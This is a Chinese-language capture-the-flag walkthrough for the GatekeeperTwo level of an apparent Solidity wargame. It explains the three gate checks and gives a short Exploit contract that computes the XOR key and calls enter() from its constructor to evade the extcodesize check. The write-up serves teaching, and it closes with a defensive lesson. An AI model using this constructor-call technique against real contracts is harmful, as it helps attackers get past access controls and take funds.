# 第十四关：GatekeeperTwo

### 本关知识点：
```
1. 内联汇编
2. solidity的encodePacked编码方式
3. solidity的uint64最大值取值
4. 合约的创建时字节码和运行时字节码
```

## 1. 题目要求
`这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关 `

## 2. 代码功能解读
![[Pasted image 20230520102046.png]]

## 3. 漏洞分析
```
成功调用enter方法
	创建一个合约来进行外部调用通过修饰器一
	通过创建一个空合约来通过修饰器二
	做异或^的算法完成修饰器三
```

## 4. 攻击方法
```
contract Exploit {

  constructor(address victim) {

    bytes8 result;

    result = bytes8(uint64(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max));

    GatekeeperTwo two = GatekeeperTwo(victim);

    two.enter(result);

  }

}
```

## 5. 攻击调用图

部署攻击合约就可以完成攻击
![[Pasted image 20230520103422.png]]
![[Pasted image 20230520103700.png]]
## 6. 知识点分析
  合约的运行时字节码为空并不代表这是一个用户账户，合约账户通过在构造器中执行代码也可以达到没有运行时字节码的效果，所以**不要用运行时字节码为空来判断是否为用户账户**。

如果对大家有用，请点赞；如果喜欢，请订阅加点赞，会一直更新~